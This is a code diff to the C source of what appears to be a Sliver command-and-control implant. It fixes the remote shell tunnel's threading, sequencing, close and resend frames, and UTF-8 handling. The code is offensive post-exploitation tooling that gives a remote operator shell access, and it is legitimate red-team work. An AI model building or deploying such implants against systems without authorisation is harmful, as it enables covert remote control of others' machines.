@@ -33,18 +33,37 @@ typedef struct {
   sliver_child_t *child;
   uint64_t sequence;
   uint64_t read_sequence;
+  volatile int stop;
+  int thread_running;
+  int closing;
 } shell_tunnel_t;
 
 typedef int (*sliver_shell_send_fn)(uint32_t type, const void *data, size_t len);
 
 static shell_tunnel_t g_tunnels[SLIVER_MAX_TUNNELS];
 static sliver_shell_send_fn g_send = NULL;
+static sliver_mutex_t *g_shell_lock = NULL;
+
+static void shell_lock(void) {
+  if (g_shell_lock == NULL) {
+    g_shell_lock = sliver_mutex_create();
+  }
+  if (g_shell_lock != NULL) {
+    sliver_mutex_lock(g_shell_lock);
+  }
+}
+
+static void shell_unlock(void) {
+  if (g_shell_lock != NULL) {
+    sliver_mutex_unlock(g_shell_lock);
+  }
+}
 
 void sliver_shell_set_sender(sliver_shell_send_fn fn) { g_send = fn; }
 
 static shell_tunnel_t *tunnel_find(uint64_t id) {
   for (size_t i = 0; i < SLIVER_MAX_TUNNELS; ++i) {
-    if (g_tunnels[i].used && g_tunnels[i].id == id) {
+    if (g_tunnels[i].used && !g_tunnels[i].closing && g_tunnels[i].id == id) {
       return &g_tunnels[i];
     }
   }
@@ -52,46 +71,74 @@ static shell_tunnel_t *tunnel_find(uint64_t id) {
 }
 
 static shell_tunnel_t *tunnel_alloc(uint64_t id, sliver_child_t *child) {
+  shell_lock();
   for (size_t i = 0; i < SLIVER_MAX_TUNNELS; ++i) {
     if (!g_tunnels[i].used) {
+      memset(&g_tunnels[i], 0, sizeof(g_tunnels[i]));
       g_tunnels[i].used = 1;
       g_tunnels[i].id = id;
       g_tunnels[i].child = child;
       g_tunnels[i].sequence = 0;
+      shell_unlock();
       return &g_tunnels[i];
     }
   }
+  shell_unlock();
   return NULL;
 }
 
+/* Releases a tunnel. While its reader thread still runs, ownership of the child
+ * process object passes to that thread: freeing it here would leave the thread
+ * reading from a freed handle (-> heap corruption / frozen session). */
 static void tunnel_release(shell_tunnel_t *t) {
   if (t == NULL || !t->used) {
     return;
   }
+  t->stop = 1;
   if (t->child != NULL) {
+    /* Unblocks the reader thread's ReadFile so it can finish on its own. */
     sliver_child_terminate(t->child);
+    sliver_child_close_stdin(t->child);
+  }
+  shell_lock();
+  if (t->thread_running) {
+    t->closing = 1;
+    shell_unlock();
+    return;
+  }
+  if (t->child != NULL) {
     sliver_child_free(t->child);
   }
   memset(t, 0, sizeof(*t));
+  shell_unlock();
 }
 
 void sliver_shell_shutdown(void) {
+  shell_lock();
   for (size_t i = 0; i < SLIVER_MAX_TUNNELS; ++i) {
-    tunnel_release(&g_tunnels[i]);
+    g_tunnels[i].stop = 1;
+    if (g_tunnels[i].child != NULL) {
+      sliver_child_terminate(g_tunnels[i].child);
+      sliver_child_close_stdin(g_tunnels[i].child);
+    }
+    g_tunnels[i].closing = 1;
   }
+  shell_unlock();
 }
 
+/* Data frame. The cumulative acknowledgement rides along in Ack (Go never sends
+ * a standalone ACK frame: such a frame would consume a sequence number and make
+ * the peer drop the next real frame as a duplicate). */
 static int send_tunnel_data(shell_tunnel_t *t, const void *data, size_t len, int closed) {
   sliver_buf_t msg;
   int rc;
 
+  (void)closed; /* closing goes through MsgTunnelClose, never a data frame */
   if (g_send == NULL) {
     return -1;
   }
   sliver_buf_init(&msg);
-  /* Sliver's tunnel numbers data frames from 0; the peer buffers anything with
-   * a higher sequence until the gap is filled, so starting at 1 silences us. */
-  if (sliver_tunnel_data_encode(&msg, data, len, closed, t->sequence, t->id, 0) != 0) {
+  if (sliver_tunnel_data_encode(&msg, data, len, 0, t->sequence, t->id, t->read_sequence) != 0) {
     sliver_buf_free(&msg);
     return -1;
   }
@@ -103,10 +150,8 @@ static int send_tunnel_data(shell_tunnel_t *t, const void *data, size_t len, int
   return rc;
 }
 
-/* Control frame: tells the peer how many of its data frames we consumed. Without
- * this the peer keeps retransmitting and eventually stops sending (the shell
- * appears to hang after a burst of output). */
-static int send_tunnel_ack(shell_tunnel_t *t) {
+/* Terminal: MsgTunnelClose{TunnelData{Closed, Sequence = exclusive prefix}}. */
+static int send_tunnel_close(shell_tunnel_t *t) {
   sliver_buf_t msg;
   int rc;
 
@@ -114,7 +159,25 @@ static int send_tunnel_ack(shell_tunnel_t *t) {
     return -1;
   }
   sliver_buf_init(&msg);
-  if (sliver_tunnel_data_encode(&msg, NULL, 0, 0, t->sequence, t->id, t->read_sequence) != 0) {
+  if (sliver_tunnel_close_encode(&msg, t->sequence, t->id) != 0) {
+    sliver_buf_free(&msg);
+    return -1;
+  }
+  rc = g_send(SLIVER_MSG_TUNNEL_CLOSE, msg.data, msg.len);
+  sliver_buf_free(&msg);
+  return rc;
+}
+
+/* Gap recovery: ask the peer to resend from read_sequence (control frame). */
+static int send_tunnel_resend(shell_tunnel_t *t) {
+  sliver_buf_t msg;
+  int rc;
+
+  if (g_send == NULL) {
+    return -1;
+  }
+  sliver_buf_init(&msg);
+  if (sliver_tunnel_resend_encode(&msg, t->sequence, t->id, t->read_sequence) != 0) {
     sliver_buf_free(&msg);
     return -1;
   }
@@ -127,34 +190,73 @@ typedef struct {
   shell_tunnel_t *tunnel;
 } shell_reader_arg_t;
 
+/* Number of trailing bytes that belong to a UTF-8 sequence cut by the read
+ * boundary, so the conversion never sees a half character. */
+static size_t utf8_incomplete_tail(const unsigned char *b, size_t n) {
+  size_t i;
+  for (i = 1; i <= 3 && i <= n; ++i) {
+    unsigned char c = b[n - i];
+    if ((c & 0xC0) != 0x80) {
+      size_t need = (c < 0x80) ? 1u : (c < 0xE0) ? 2u : (c < 0xF0) ? 3u : 4u;
+      return need > i ? i : 0;
+    }
+  }
+  return 0;
+}
+
 static void shell_reader_thread(void *arg) {
   shell_reader_arg_t *r = (shell_reader_arg_t *)arg;
-  char buf[SLIVER_SHELL_READ_CHUNK];
+  shell_tunnel_t *t = r->tunnel;
+  sliver_child_t *child = t->child;
+  char buf[SLIVER_SHELL_READ_CHUNK + 4];
+  size_t carry_len = 0;
 
   for (;;) {
-    long n = sliver_child_read(r->tunnel->child, buf, sizeof(buf));
+    long n;
+    size_t total, tail, conv;
+    if (t->stop) {
+      break;
+    }
+    n = sliver_child_read(child, buf + carry_len, SLIVER_SHELL_READ_CHUNK);
     if (n <= 0) {
       break;
     }
+    total = carry_len + (size_t)n;
+    tail = utf8_incomplete_tail((const unsigned char *)buf, total);
+    conv = total - tail;
+    if (conv != 0) {
 #if defined(_WIN32)
-    /* The client console is usually CP936: hand it ANSI bytes, otherwise every
-     * Chinese character shows up as mojibake. */
-    {
       size_t converted = 0;
-      char acp[SLIVER_SHELL_READ_CHUNK * 2];
-      if (sliver_acp_from_utf8(buf, (size_t)n, acp, sizeof(acp), &converted) == 0) {
-        if (send_tunnel_data(r->tunnel, acp, converted, 0) != 0) {
+      char acp[SLIVER_SHELL_READ_CHUNK * 2 + 8];
+      if (sliver_acp_from_utf8(buf, conv, acp, sizeof(acp), &converted) == 0) {
+        if (send_tunnel_data(t, acp, converted, 0) != 0) {
           break;
         }
-        continue;
+      } else
+#endif
+      if (send_tunnel_data(t, buf, conv, 0) != 0) {
+        break;
       }
     }
-#endif
-    if (send_tunnel_data(r->tunnel, buf, (size_t)n, 0) != 0) {
-      break;
-    }
+    memmove(buf, buf + conv, tail);
+    carry_len = tail;
   }
-  (void)send_tunnel_data(r->tunnel, NULL, 0, 1);
+  if (carry_len != 0 && !t->stop) {
+    (void)send_tunnel_data(t, buf, carry_len, 0); /* flush an odd trailing byte */
+  }
+  if (!t->stop) {
+    (void)send_tunnel_close(t);
+  }
+  /* The reader owns the child object while it runs: it is the only thread that
+   * may free it (see tunnel_release). */
+  shell_lock();
+  if (child != NULL) {
+    sliver_child_free(child);
+  }
+  t->child = NULL;
+  t->thread_running = 0;
+  memset(t, 0, sizeof(*t));
+  shell_unlock();
   free(r);
 }
 
@@ -251,8 +353,10 @@ int sliver_rpc_handle_shell(const sliver_envelope_t *req, sliver_buf_t *out) {
   arg = (shell_reader_arg_t *)calloc(1, sizeof(*arg));
   if (arg != NULL) {
     arg->tunnel = t;
-    /* The reader thread owns `arg` and runs until the child exits. */
+    t->thread_running = 1;
+    /* The reader thread owns `arg` and the child object until it exits. */
     if (sliver_thread_create(shell_reader_thread, arg) == NULL) {
+      t->thread_running = 0;
       free(arg);
       LOG_WARN("shell: cannot start reader thread");
     }
@@ -275,17 +379,10 @@ int sliver_rpc_handle_tunnel_data(const sliver_envelope_t *req, sliver_buf_t *ou
   if (sliver_portfwd_tunnel_data(&td)) {
     return -2;
   }
-  /* Unknown tunnel id: the client binds a freshly created tunnel with a zero
-   * byte TunnelData before sending PortfwdReq - acknowledge it. */
-  if (sliver_portfwd_bind(td.tunnel_id)) {
-    return -2;
-  }
   t = tunnel_find(td.tunnel_id);
   if (t == NULL) {
-    return -2;
-  }
-  /* Pure ACK from the peer: nothing to deliver. */
-  if (td.ack != 0 && td.data_len == 0 && !td.closed) {
+    /* Unknown tunnel: the Go implant simply drops such frames. Creating state
+     * for them used to steal a portfwd slot and leave a sequence gap. */
     return -2;
   }
   if (td.sequence == t->read_sequence) {
@@ -296,10 +393,12 @@ int sliver_rpc_handle_tunnel_data(const sliver_envelope_t *req, sliver_buf_t *ou
       sliver_child_close_stdin(t->child);
     }
     t->read_sequence++;
+  } else if (td.sequence > t->read_sequence) {
+    /* Gap: ask for the missing frames instead of going silent forever. */
+    LOG_DEBUG("tunnel: gap on id=%llu (want %llu got %llu)", (unsigned long long)t->id,
+              (unsigned long long)t->read_sequence, (unsigned long long)td.sequence);
+    (void)send_tunnel_resend(t);
   }
-  /* Duplicates (sequence < read_sequence) and gaps are acknowledged as-is so the
-   * peer stops retransmitting and re-sends what is actually missing. */
-  (void)send_tunnel_ack(t);
   return -2;
 }
 
@@ -316,8 +415,11 @@ int sliver_rpc_handle_tunnel_close(const sliver_envelope_t *req, sliver_buf_t *o
 
 int sliver_rpc_handle_shell_resize(const sliver_envelope_t *req, sliver_buf_t *out) {
   (void)req;
+  /* The server awaits a response on the same envelope id (unary RPC): answer with
+   * an empty message, otherwise the client times out. Piped shells ignore the
+   * size, ConPTY support comes later. */
   (void)out;
-  return -2; /* piped shells have no window size */
+  return 0;
 }
 
 
